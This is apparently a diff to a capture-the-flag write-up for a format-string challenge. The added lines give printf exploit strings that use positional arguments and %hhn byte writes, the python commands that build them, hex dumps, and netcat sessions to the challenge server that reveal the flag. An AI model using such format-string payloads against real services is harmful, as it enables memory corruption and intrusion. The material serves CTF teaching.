@@ -147,14 +147,29 @@ gigem{F0RM@1NG_1S_H4RD}
 
 The exploit string can be simplified:
 
-We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`. 
-
-_**This part needs to be re written**_
+We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`.
 
 The exploit string in this case would be:
 
 ```
-\x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn
+\x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%5$hhn
+```
+
+If we use python we need to properly escape the string, the `$` symbols needs to be escaped:
+
+```
+$ python -c "print '\x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4\$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%5\$hhn'" > exploit
+
+$ xxd exploit
+0000000: 1da0 0408 1ca0 0408 2531 3235 7825 3424  ........%125x%4$
+0000010: 6868 6e41 4141 4141 4141 4141 4141 4141  hhnAAAAAAAAAAAAA
+0000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+0000030: 4141 4141 4141 4141 4125 3524 6868 6e0a  AAAAAAAAA%5$hhn.
+
+$  nc pwn.ctf.tamu.edu 4323 < exploit
+Enter a word to be echoed:
+��                                  2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThis function has been deprecated
+gigem{F0RM@1NG_1S_H4RD}
 ```
 
 **Alternative approach instead of appending 38 A's**
@@ -163,6 +178,29 @@ Alternatively, before the 2nd address, we can write a dummy dword \(`0xDEADBEEF`
 
 ```
 \x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%08x%08x%105x%hhn%38x%hhn
+```
+
+or if we use positional arguments, the exploit string becomes even more shorter:
+
+```
+\x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%121x%4$hhn%38x%6$hhn
+```
+
+Using python,
+
+```bash
+$ python -c "print '\x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%121x%4\$hhn%38x%6\$hhn'" > exploit
+
+$ xxd exploit 
+0000000: 1da0 0408 dead beef 1ca0 0408 2531 3231  ............%121
+0000010: 7825 3424 6868 6e25 3338 7825 3624 6868  x%4$hhn%38x%6$hh
+0000020: 6e0a 
+
+$ nc pwn.ctf.tamu.edu 4323 < exploit
+Enter a word to be echoed:
+�ޭ���                               2                                     0This function has been deprecated
+gigem{F0RM@1NG_1S_H4RD}
+
 ```
 
 ## Using pwntools \(automated\)
